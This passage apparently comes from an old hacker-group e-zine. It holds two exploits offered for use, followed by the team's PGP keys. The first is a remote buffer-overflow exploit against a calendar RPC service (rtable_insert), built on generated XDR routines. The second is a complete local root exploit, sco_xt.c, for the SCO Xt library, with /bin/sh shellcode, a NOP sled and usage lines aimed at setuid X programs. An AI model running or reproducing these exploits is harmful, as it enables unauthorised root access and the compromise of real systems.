 */

bool_t
xdr_Buffer(xdrs, objp)
	register XDR *xdrs;
	Buffer *objp;
{

	register long *buf;

	if (!xdr_string(xdrs, objp, ~0))
		return (FALSE);
	return (TRUE);
}

bool_t
xdr_Transaction(xdrs, objp)
	register XDR *xdrs;
	Transaction *objp;
{

	register long *buf;

	if (!xdr_enum(xdrs, (enum_t *)objp))
		return (FALSE);
	return (TRUE);
}

bool_t
xdr_Interval(xdrs, objp)
	register XDR *xdrs;
	Interval *objp;
{

	register long *buf;

	if (!xdr_enum(xdrs, (enum_t *)objp))
		return (FALSE);
	return (TRUE);
}

bool_t
xdr_Period(xdrs, objp)
	register XDR *xdrs;
	Period *objp;
{

	register long *buf;

	if (!xdr_Interval(xdrs, &objp->period))
		return (FALSE);
	if (!xdr_int(xdrs, &objp->nth))
		return (FALSE);
	if (!xdr_long(xdrs, &objp->enddate))
		return (FALSE);
	return (TRUE);
}

bool_t
xdr_Event_Type(xdrs, objp)
	register XDR *xdrs;
	Event_Type *objp;
{

	register long *buf;

	if (!xdr_enum(xdrs, (enum_t *)objp))
		return (FALSE);
	return (TRUE);
}

bool_t
xdr_Options(xdrs, objp)
	register XDR *xdrs;
	Options *objp;
{

	register long *buf;

	if (!xdr_enum(xdrs, (enum_t *)objp))
		return (FALSE);
	return (TRUE);
}

bool_t
xdr_Tag(xdrs, objp)
	register XDR *xdrs;
	Tag *objp;
{

	register long *buf;

	if (!xdr_Event_Type(xdrs, &objp->tag))
		return (FALSE);
	if (!xdr_int(xdrs, &objp->showtime))
		return (FALSE);
	if (!xdr_pointer(xdrs, (char **)&objp->next, sizeof (Tag), (xdrproc_t) xdr_Tag))
		return (FALSE);
	return (TRUE);
}

bool_t
xdr_Privacy_Level(xdrs, objp)
	register XDR *xdrs;
	Privacy_Level *objp;
{

	register long *buf;

	if (!xdr_enum(xdrs, (enum_t *)objp))
		return (FALSE);
	return (TRUE);
}

bool_t
xdr_Attribute(xdrs, objp)
	register XDR *xdrs;
	Attribute *objp;
{

	register long *buf;

	if (!xdr_pointer(xdrs, (char **)&objp->next, sizeof (Attribute), (xdrproc_t) xdr_Attribute))
		return (FALSE);
	if (!xdr_Buffer(xdrs, &objp->attr))
		return (FALSE);
	if (!xdr_Buffer(xdrs, &objp->value))
		return (FALSE);
	if (!xdr_Buffer(xdrs, &objp->clientdata))
		return (FALSE);
	return (TRUE);
}

bool_t
xdr_Attr(xdrs, objp)
	register XDR *xdrs;
	Attr *objp;
{

	register long *buf;

	if (!xdr_pointer(xdrs, (char **)objp, sizeof (Attribute), (xdrproc_t) xdr_Attribute))
		return (FALSE);
	return (TRUE);
}

bool_t
xdr_Except(xdrs, objp)
	register XDR *xdrs;
	Except *objp;
{

	register long *buf;

	if (!xdr_int(xdrs, &objp->ordinal))
		return (FALSE);
	if (!xdr_pointer(xdrs, (char **)&objp->next, sizeof (Except), (xdrproc_t) xdr_Except))
		return (FALSE);
	return (TRUE);
}

bool_t
xdr_Exception(xdrs, objp)
	register XDR *xdrs;
	Exception *objp;
{

	register long *buf;

	if (!xdr_pointer(xdrs, (char **)objp, sizeof (Except), (xdrproc_t) xdr_Except))
		return (FALSE);
	return (TRUE);
}

bool_t
xdr_Id(xdrs, objp)
	register XDR *xdrs;
	Id *objp;
{

	register long *buf;

	if (!xdr_long(xdrs, &objp->tick))
		return (FALSE);
	if (!xdr_long(xdrs, &objp->key))
		return (FALSE);
	return (TRUE);
}

bool_t
xdr_Uid(xdrs, objp)
	register XDR *xdrs;
	Uid *objp;
{

	register long *buf;

	if (!xdr_Id(xdrs, &objp->appt_id))
		return (FALSE);
	if (!xdr_pointer(xdrs, (char **)&objp->next, sizeof (Uid), (xdrproc_t) xdr_Uid))
		return (FALSE);
	return (TRUE);
}

bool_t
xdr_Appt_Status(xdrs, objp)
	register XDR *xdrs;
	Appt_Status *objp;
{

	register long *buf;

	if (!xdr_enum(xdrs, (enum_t *)objp))
		return (FALSE);
	return (TRUE);
}

bool_t
xdr_Appt(xdrs, objp)
	register XDR *xdrs;
	Appt *objp;
{

	register long *buf;

	if (!xdr_Id(xdrs, &objp->appt_id))
		return (FALSE);
	if (!xdr_pointer(xdrs, (char **)&objp->tag, sizeof (Tag), (xdrproc_t) xdr_Tag))
		return (FALSE);
	if (!xdr_int(xdrs, &objp->duration))
		return (FALSE);
	if (!xdr_int(xdrs, &objp->ntimes))
		return (FALSE);
	if (!xdr_Buffer(xdrs, &objp->what))
		return (FALSE);
	if (!xdr_Period(xdrs, &objp->period))
		return (FALSE);
	if (!xdr_Buffer(xdrs, &objp->author))
		return (FALSE);
	if (!xdr_Buffer(xdrs, &objp->client_data))
		return (FALSE);
	if (!xdr_pointer(xdrs, (char **)&objp->exception, sizeof (Except), (xdrproc_t) xdr_Except))
		return (FALSE);
	if (!xdr_pointer(xdrs, (char **)&objp->attr, sizeof (Attribute), (xdrproc_t) xdr_Attribute))
		return (FALSE);
	if (!xdr_Appt_Status(xdrs, &objp->appt_status))
		return (FALSE);
	if (!xdr_Privacy_Level(xdrs, &objp->privacy))
		return (FALSE);
	if (!xdr_pointer(xdrs, (char **)&objp->next, sizeof (Appt), (xdrproc_t) xdr_Appt))
		return (FALSE);
	return (TRUE);
}

bool_t
xdr_Abb_Appt(xdrs, objp)
	register XDR *xdrs;
	Abb_Appt *objp;
{

	register long *buf;

	if (!xdr_Id(xdrs, &objp->appt_id))
		return (FALSE);
	if (!xdr_pointer(xdrs, (char **)&objp->tag, sizeof (Tag), (xdrproc_t) xdr_Tag))
		return (FALSE);
	if (!xdr_Buffer(xdrs, &objp->what))
		return (FALSE);
	if (!xdr_int(xdrs, &objp->duration))
		return (FALSE);
	if (!xdr_Period(xdrs, &objp->period))
		return (FALSE);
	if (!xdr_pointer(xdrs, (char **)&objp->next, sizeof (Abb_Appt), (xdrproc_t) xdr_Abb_Appt))
		return (FALSE);
	if (!xdr_Appt_Status(xdrs, &objp->appt_status))
		return (FALSE);
	if (!xdr_Privacy_Level(xdrs, &objp->privacy))
		return (FALSE);
	return (TRUE);
}

bool_t
xdr_Apptid(xdrs, objp)
	register XDR *xdrs;
	Apptid *objp;
{

	register long *buf;

	if (!xdr_pointer(xdrs, (char **)&objp->oid, sizeof (Id), (xdrproc_t) xdr_Id))
		return (FALSE);
	if (!xdr_pointer(xdrs, (char **)&objp->new_appt, sizeof (Appt), (xdrproc_t) xdr_Appt))
		return (FALSE);
	if (!xdr_Options(xdrs, &objp->option))
		return (FALSE);
	return (TRUE);
}

bool_t
xdr_Reminder(xdrs, objp)
	register XDR *xdrs;
	Reminder *objp;
{

	register long *buf;

	if (!xdr_Id(xdrs, &objp->appt_id))
		return (FALSE);
	if (!xdr_long(xdrs, &objp->tick))
		return (FALSE);
	if (!xdr_Attribute(xdrs, &objp->attr))
		return (FALSE);
	if (!xdr_pointer(xdrs, (char **)&objp->next, sizeof (Reminder), (xdrproc_t) xdr_Reminder))
		return (FALSE);
	return (TRUE);
}

bool_t
xdr_Table_Res_Type(xdrs, objp)
	register XDR *xdrs;
	Table_Res_Type *objp;
{

	register long *buf;

	if (!xdr_enum(xdrs, (enum_t *)objp))
		return (FALSE);
	return (TRUE);
}

bool_t
xdr_Table_Res_List(xdrs, objp)
	register XDR *xdrs;
	Table_Res_List *objp;
{

	register long *buf;

	if (!xdr_Table_Res_Type(xdrs, &objp->tag))
		return (FALSE);
	switch (objp->tag) {
	case AP:
		if (!xdr_pointer(xdrs, (char **)&objp->Table_Res_List_u.a, sizeof (Appt), (xdrproc_t) xdr_Appt))
			return (FALSE);
		break;
	case RM:
		if (!xdr_pointer(xdrs, (char **)&objp->Table_Res_List_u.r, sizeof (Reminder), (xdrproc_t) xdr_Reminder))
			return (FALSE);
		break;
	case AB:
		if (!xdr_pointer(xdrs, (char **)&objp->Table_Res_List_u.b, sizeof (Abb_Appt), (xdrproc_t) xdr_Abb_Appt))
			return (FALSE);
		break;
	case ID:
		if (!xdr_pointer(xdrs, (char **)&objp->Table_Res_List_u.i, sizeof (Uid), (xdrproc_t) xdr_Uid))
			return (FALSE);
		break;
	}
	return (TRUE);
}

bool_t
xdr_Access_Status(xdrs, objp)
	register XDR *xdrs;
	Access_Status *objp;
{

	register long *buf;

	if (!xdr_enum(xdrs, (enum_t *)objp))
		return (FALSE);
	return (TRUE);
}

bool_t
xdr_Table_Res(xdrs, objp)
	register XDR *xdrs;
	Table_Res *objp;
{

	register long *buf;

	if (!xdr_Access_Status(xdrs, &objp->status))
		return (FALSE);
	if (!xdr_Table_Res_List(xdrs, &objp->res))
		return (FALSE);
	return (TRUE);
}
#define access_none   0x0     /* owner only */
#define access_read   0x1
#define access_write  0x2
#define access_delete 0x4
#define access_exec   0x8     /* execution permission is a hack! */
#define WORLD "world"	/* special user */

bool_t
xdr_Access_Entry(xdrs, objp)
	register XDR *xdrs;
	Access_Entry *objp;
{

	register long *buf;

	if (!xdr_Buffer(xdrs, &objp->who))
		return (FALSE);
	if (!xdr_int(xdrs, &objp->access_type))
		return (FALSE);
	if (!xdr_pointer(xdrs, (char **)&objp->next, sizeof (Access_Entry), (xdrproc_t) xdr_Access_Entry))
		return (FALSE);
	return (TRUE);
}

bool_t
xdr_Access_Args(xdrs, objp)
	register XDR *xdrs;
	Access_Args *objp;
{

	register long *buf;

	if (!xdr_Buffer(xdrs, &objp->target))
		return (FALSE);
	if (!xdr_pointer(xdrs, (char **)&objp->access_list, sizeof (Access_Entry), (xdrproc_t) xdr_Access_Entry))
		return (FALSE);
	return (TRUE);
}

bool_t
xdr_Range(xdrs, objp)
	register XDR *xdrs;
	Range *objp;
{

	register long *buf;

	if (!xdr_long(xdrs, &objp->key1))
		return (FALSE);
	if (!xdr_long(xdrs, &objp->key2))
		return (FALSE);
	if (!xdr_pointer(xdrs, (char **)&objp->next, sizeof (Range), (xdrproc_t) xdr_Range))
		return (FALSE);
	return (TRUE);
}

bool_t
xdr_Keyrange(xdrs, objp)
	register XDR *xdrs;
	Keyrange *objp;
{

	register long *buf;

	if (!xdr_long(xdrs, &objp->key))
		return (FALSE);
	if (!xdr_long(xdrs, &objp->tick1))
		return (FALSE);
	if (!xdr_long(xdrs, &objp->tick2))
		return (FALSE);
	if (!xdr_pointer(xdrs, (char **)&objp->next, sizeof (Keyrange), (xdrproc_t) xdr_Keyrange))
		return (FALSE);
	return (TRUE);
}

bool_t
xdr_Uidopt(xdrs, objp)
	register XDR *xdrs;
	Uidopt *objp;
{

	register long *buf;

	if (!xdr_Id(xdrs, &objp->appt_id))
		return (FALSE);
	if (!xdr_Options(xdrs, &objp->option))
		return (FALSE);
	if (!xdr_pointer(xdrs, (char **)&objp->next, sizeof (Uidopt), (xdrproc_t) xdr_Uidopt))
		return (FALSE);
	return (TRUE);
}

bool_t
xdr_Table_Args_Type(xdrs, objp)
	register XDR *xdrs;
	Table_Args_Type *objp;
{

	register long *buf;

	if (!xdr_enum(xdrs, (enum_t *)objp))
		return (FALSE);
	return (TRUE);
}

bool_t
xdr_Args(xdrs, objp)
	register XDR *xdrs;
	Args *objp;
{

	register long *buf;

	if (!xdr_Table_Args_Type(xdrs, &objp->tag))
		return (FALSE);
	switch (objp->tag) {
	case TICK_4:
		if (!xdr_long(xdrs, &objp->Args_u.tick))
			return (FALSE);
		break;
	case APPTID:
		if (!xdr_Apptid(xdrs, &objp->Args_u.apptid))
			return (FALSE);
		break;
	case UID:
		if (!xdr_pointer(xdrs, (char **)&objp->Args_u.key, sizeof (Uid), (xdrproc_t) xdr_Uid))
			return (FALSE);
		break;
	case APPT:
		if (!xdr_pointer(xdrs, (char **)&objp->Args_u.appt, sizeof (Appt), (xdrproc_t) xdr_Appt))
			return (FALSE);
		break;
	case RANGE:
		if (!xdr_pointer(xdrs, (char **)&objp->Args_u.range, sizeof (Range), (xdrproc_t) xdr_Range))
			return (FALSE);
		break;
	case KEYRANGE:
		if (!xdr_pointer(xdrs, (char **)&objp->Args_u.keyrange, sizeof (Keyrange), (xdrproc_t) xdr_Keyrange))
			return (FALSE);
		break;
	case UIDOPT:
		if (!xdr_pointer(xdrs, (char **)&objp->Args_u.uidopt, sizeof (Uidopt), (xdrproc_t) xdr_Uidopt))
			return (FALSE);
		break;
	default:
		return (FALSE);
	}
	return (TRUE);
}

bool_t
xdr_Table_Args(xdrs, objp)
	register XDR *xdrs;
	Table_Args *objp;
{

	register long *buf;

	if (!xdr_Buffer(xdrs, &objp->target))
		return (FALSE);
	if (!xdr_Args(xdrs, &objp->args))
		return (FALSE);
	if (!xdr_int(xdrs, &objp->pid))
		return (FALSE);
	return (TRUE);
}

bool_t
xdr_Registration(xdrs, objp)
	register XDR *xdrs;
	Registration *objp;
{

	register long *buf;

	if (!xdr_Buffer(xdrs, &objp->target))
		return (FALSE);
	if (!xdr_u_long(xdrs, &objp->prognum))
		return (FALSE);
	if (!xdr_u_long(xdrs, &objp->versnum))
		return (FALSE);
	if (!xdr_u_long(xdrs, &objp->procnum))
		return (FALSE);
	if (!xdr_pointer(xdrs, (char **)&objp->next, sizeof (Registration), (xdrproc_t) xdr_Registration))
		return (FALSE);
	if (!xdr_int(xdrs, &objp->pid))
		return (FALSE);
	return (TRUE);
}

bool_t
xdr_Table_Op_Args(xdrs, objp)
	register XDR *xdrs;
	Table_Op_Args *objp;
{

	register long *buf;

	if (!xdr_Buffer(xdrs, &objp->target))
		return (FALSE);
	if (!xdr_Buffer(xdrs, &objp->new_target))
		return (FALSE);
	return (TRUE);
}

bool_t
xdr_Table_Status(xdrs, objp)
	register XDR *xdrs;
	Table_Status *objp;
{

	register long *buf;

	if (!xdr_enum(xdrs, (enum_t *)objp))
		return (FALSE);
	return (TRUE);
}

bool_t
xdr_Registration_Status(xdrs, objp)
	register XDR *xdrs;
	Registration_Status *objp;
{

	register long *buf;

	if (!xdr_enum(xdrs, (enum_t *)objp))
		return (FALSE);
	return (TRUE);
}

/*
 * rtable_delete and rtable_change take over the functionality of
 * rtable_delete_instance and rtable_change_instance repectively.
 * rtable_delete_instance and rtable_change_instance are now dummy
 * routines exist for backward compatibility purpose and return
 * access_notsupported.
 */

extern Appt* make_appt();
extern void destroy_appt();
extern void destroy_list();
extern Appt *copy_appt();
extern Appt *copy_semiprivate_appt();
extern Abb_Appt *make_abbrev_appt();
extern void destroy_abbrev_appt();
extern Abb_Appt *copy_abbrev_appt();
extern Abb_Appt *appt_to_abbrev();
extern Abb_Appt *appt_to_semiprivate_abbrev();
extern Reminder* make_reminder();
extern void destroy_reminder();
extern Reminder* copy_reminder();
extern Uid* make_keyentry();
extern void destroy_keyentry();
extern Uid* copy_keyentry();
extern Access_Entry* make_access_entry();
extern Access_Entry* copy_access_list();
extern void destroy_access_list();
extern Abb_Appt *copy_single_abbrev_appt();
extern Attribute *make_attr();

/* ----- rpcgen ----- */

unsigned long resolve(char *host)
{
  long i;
  struct hostent *he;

  if((i=inet_addr(host))==(-1))
    if(!(he=gethostbyname(host)))
      return(0);
    else
      return(*(unsigned long *)he->h_addr);

  return(i);
}

int main(int argc, char *argv[])
{
  char obuf[OFBUFSIZ+1], abuf[ALIGN+1];
  struct sockaddr_in sin;
  struct timeval tv;
  Table_Op_Args toa;
  Table_Status ts;
  Table_Args ta;
  Table_Res tr;
  Appt ap;
  int sock;
  unsigned long *ptr;
  CLIENT *c;

  if(argc!=2)
    {
      (void)fprintf(stderr,"error: usage: %s <full hostname>\n",argv[0]);
      exit(-1);
    }

  (void)memset(&sin,0,sizeof(sin));
  sin.sin_family = AF_INET;

  if(!(sin.sin_addr.s_addr=resolve(argv[1])))
    {
      (void)fprintf(stderr,"error: can not resolve: %s\n",argv[1]);
      exit(-1);
    }

  (void)memset(&tv,0,sizeof(tv));
  tv.tv_sec = 7;

  sock = RPC_ANYSOCK;
  if(!(c=(CLIENT *)clntudp_create(&sin,TABLEPROG,4,tv,&sock)))
    {
      (void)clnt_pcreateerror(argv[0]);
      exit(1);
    }
  c->cl_auth = authunix_create(argv[1],0,0,0,0);

  (void)memset(&toa,0,sizeof(toa));
  toa.target = cname;

  (void)memset(&ts,0,sizeof(ts));

  if(clnt_call(c,rtable_create,xdr_Table_Op_Args,(caddr_t)&toa,
	       xdr_Table_Status,(caddr_t)&ts,tv)!=RPC_SUCCESS)
    {
      (void)clnt_perror(c,"error: rtable_create");
      exit(-1);
    }

  (void)memset(abuf,0xff,sizeof(abuf));
  abuf[sizeof(abuf)-1] = 0;

  for(ptr=(unsigned long *)obuf;
      ptr<(unsigned long *)(obuf+BUFSIZ-(sizeof(c0de)-sizeof(unsigned long)));
      ptr++)
    *ptr = *(unsigned long *)c0de;

  (void)strcpy((char *)ptr,(c0de+sizeof(unsigned long)));

  ptr += ((sizeof(c0de)/sizeof(unsigned long))-1);

  for(;ptr<(unsigned long *)(obuf+BUFSIZ+PRE_RET);ptr++)
    *ptr = (0xeffffff0-RW_OFFSET);

  for(;ptr<(unsigned long *)(obuf+BUFSIZ+REG_W_SIZ);ptr++)
    *ptr = (0xeffffff0-X_OFFSET);

  for(;ptr<(unsigned long *)(obuf+BUFSIZ+REG_W_SIZ+NOPS);ptr++)
    *ptr = *(unsigned long *)c0de;

  (void)strcpy((char *)ptr,(c0de+sizeof(unsigned long)));

  (void)memset(&ap,0,sizeof(ap));
  ap.duration = ap.ntimes = ap.period.period = ap.period.nth = 1;
  ap.what = abuf;
  ap.client_data = &obuf[2];

  (void)memset(&ta,0,sizeof(ta));
  ta.args.tag = APPT;
  ta.target = cname;
  ta.args.Args_u.appt = &ap;

  (void)memset(&tr,0,sizeof(tr));

  if(clnt_call(c,rtable_insert,xdr_Table_Args,(caddr_t)&ta,
	       xdr_Table_Res,(caddr_t)&tr,tv)!=RPC_SUCCESS)
    (void)printf("possible success\n");
  else
    {
      (void)fprintf(stderr,"error: exploit faile: rtable_insert returned\n");
      exit(-1);
    }

  (void)clnt_destroy(c);

  return(0);
}

 -------------------------------------------------
 ---[ Nombre  : sco_xt.c
 ---[ Sistema : SCO 5.0.5
 ---[ Causa   : r00t
 ---[ Creditos: Brock Tellier / btellier@webley.com
 -------------------------------------------------


/*
 * Generic SCO Xt library overflow program by Brock Tellier
 * btellier@webley.com
 * Tested on SCO 5.0.5+Skunkware98
 * All programs using the Xt library are believed vulnerable
 *
   Compile gcc -o sco_xt sco_xt.c
   Usage: /usr/bin/X11/scolock -bg `./sco_xt -9000 2000`
          /usr/bin/X11/xmcd -bg `./sco_xt -8500 2000`
   /usr/bin/X11/xlock -bg `./sco_xt -8500 2000`
   /usr/bin/X11/xterm -bg `./sco_xt -9000 2000`

 * NOTE: xscreensaver and xload are vulnerable to the overflow but drop
 * privs before the overflow occurs.  Of course, they were suid auth so
that
 * they could read /etc/shadow and thus your shellcode could exploit
something
 * along those lines.  I got shells out of them by doing:
   /usr/bin/X11/xscreensaver -bg `./sco_xt -8404 2200`
   /usr/bin/X11/xload -bg `./sco_xt -8404 2200`
 */


#include <stdlib.h>
#include <stdio.h>

char scoshell[]= /* doble@iname.com */
"\xeb\x1b\x5e\x31\xdb\x89\x5e\x07\x89\x5e\x0c\x88\x5e\x11\x31\xc0"
"\xb0\x3b\x8d\x7e\x07\x89\xf9\x53\x51\x56\x56\xeb\x10\xe8\xe0\xff"
"\xff\xff/bin/sh\xaa\xaa\xaa\xaa\x9a\xaa\xaa\xaa\xaa\x07\xaa";


#define LEN 10000
#define NOP 0x90

unsigned long get_sp(void) {

__asm__("movl %esp, %eax");

}


int main(int argc, char *argv[]) {

long int offset=0;

int i;
int buflen = LEN;
long int addr;
char buf[LEN];

if(argc < 3) {
 fprintf(stderr, "Error: Usage: %s offset buffer\n", argv[0]);
 exit(0);
}
else {
 offset=atoi(argv[1]);
        buflen=atoi(argv[2]);
}


addr=get_sp();

fprintf(stderr, "Generic SCO Xt library overflow program\n");
fprintf(stderr, "By Brock Tellier btellier@webley.com\n\n");
fprintf(stderr, "Using addr: 0x%x\n", addr-offset);


memset(buf,NOP,buflen);
memcpy(buf+(buflen/2),scoshell,strlen(scoshell));
for(i=((buflen/2) + strlen(scoshell))+4;i<buflen-4;i+=4)
 *(int *)&buf[i]=addr-offset;

for(i=0;i<buflen;i++)
 putchar(buf[i]);

exit(0);
}

 >อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ<
 ฐฐฐฐฐฐฐฐฐฐฐฐฑฑฑฑฑฑฑฑฑฑฑฑฒฒฒฒฒฒฒฒฒฒฒฒฒฐฐฐฐฐฐฐฐฐฐฐฐฐฑฑฑฑฑฑฑฑฑฑฑฑฒฒฒฒฒฒฒฒฒฒฒฒฒ
 >อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ<

                        [   L L A V E S   P G P   ]

 ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
 Raza Mexicana Team
 ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

 -----BEGIN PGP PUBLIC KEY BLOCK-----
 Version: PGPfreeware 6.0.2i
 Comment: Raza Mexicana Team

 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
 CEs967UEAKCF8VOwfsMvRS9gkGM+px5iZJg32w==
 =mhb4
 -----END PGP PUBLIC KEY BLOCK-----

 ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
 xDAWN  --- (xdawn@bigfoot.com)
 ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

 -----BEGIN PGP PUBLIC KEY BLOCK-----
 Version: 2.6.3ia
 Comment: Raza Mexicana Team

 mQCNAzPBvE8AAAEEAKYzpQ2eJThQEI3ovrC1RDgg3lyvXAl4ci4a+HL2AAJ89Ici
 x6b5gtzLiPH7oxA/zQ8feA/aWx0bLnuhLio8gEceYtwz4Z7DSRDWU61KR0DcQVv5
 q/7lmk6UDpOnvtJbwG6Unja7JeXjB0m0Y4I/Dw1cw4aM4Jw9lnqE7+XPId7NAAUR
 tBl4REFXTiA8eGRhd25AYmlnZm9vdC5jb20+iQCVAwUQNorM4nqE7+XPId7NAQEJ
 JQP+Mv7hOf5EatNa2cRHyXQ61hAwNsJuiTnkDusp1a+OMXHLOXrhqweKbZsOxrtb
 RPpz0nI/6w+zHkGtnsUPR7Xt4Bbv8vjqqB1eVsRos73M+v/PCHoUKw6Btxz8ILpT
 df0GEGtfrKVJtPCBugIAULu7KB1M7hs1L9jJsmtsmEDLfQ6JARUCBRAz1CfprjA7
 ZhGTxN0BAStrB/9xhdEWUWEHpOF5xLqF8qHYSEQoI9rZiR5pOKIkLBd2cz+vsqO5
 KB553HxaqceqZyjEpLaM5Cdoycwsg7kKJSLxLgVkC4e4g2hSuETADMGXGXsxTR9X
 Ndyqc4RX4Dk9JLz1QcqsIm5AN8NFy7hqayhIBPtQAKW3gbgZgItKOaF6CjJuqt2i
 cBv8GqTqNuqNNxMAeu1Pjpt0mNlCgXeMS3lLj4oLYudgbj7ScyL+jZKNUkYQBGyV
 xU1XQDKEwBIUs9FJwZ/OnZ+A22br5/8HHfPKIKXKpE1Rad2aww/JbyWW+lbx5cBi
 bZgCgXJWabrj139JVH2l13ud7vs0MNaClkIT
 =0WOG
 -----END PGP PUBLIC KEY BLOCK-----

 ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
 Yo_Soy --- (varf@bigfoot.com)
 ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ

 -----BEGIN PGP PUBLIC KEY BLOCK-----
 Version: PGPfreeware 6.5.1 for non-commercial use <http://www.pgp.com>

 mQGiBDXd390RBAD2O5PdPfbB/Na6xe8WZQhqgbI9ZN8mo5ra8AphgGJm9nzJmDNr
 K4+wGrIdeI1I7bEv+5L2t7oz2Lye+U2wGGFfPvdAit7Vh50eim0OTQWayT/EuPLA
 bYUJz0AtrQ85b+KYmF7LEh5PbRSOaxIqCWq1sDloEnxYEqCbXBlTIe/UyQCg/8Yg
 cwFZkonW1UXdQ9Y1THdnaL8EANMLBs371kkOOBXElsoGFtdD8VvCEi7Dd1zXbWsp
 9dGBkTPp1OLVR9IdktjbxEizPL2CDxR+O5Wp481i+9Rv+yrl63LX505pfjHlFKmh
